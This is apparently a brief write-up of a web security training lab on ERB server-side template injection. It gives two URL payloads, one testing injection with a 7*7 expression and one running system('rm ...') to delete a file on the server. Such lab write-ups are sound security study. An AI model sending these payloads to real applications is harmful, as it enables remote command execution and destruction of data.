# Lab: Basic server-side template injection

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

## SSTI
* 訪問第一個商品的時候，會跳出 message，存在 ERB template injection
```
payload = https://acde1fdc1ef983aec05d072f00a50015.web-security-academy.net/?message=%3C%=%207%20*%207%20%%3E
```
```
payload = https://acde1fdc1ef983aec05d072f00a50015.web-security-academy.net/?message=<%=%20system("rm%20/home/carlos/morale.txt")%20%>
```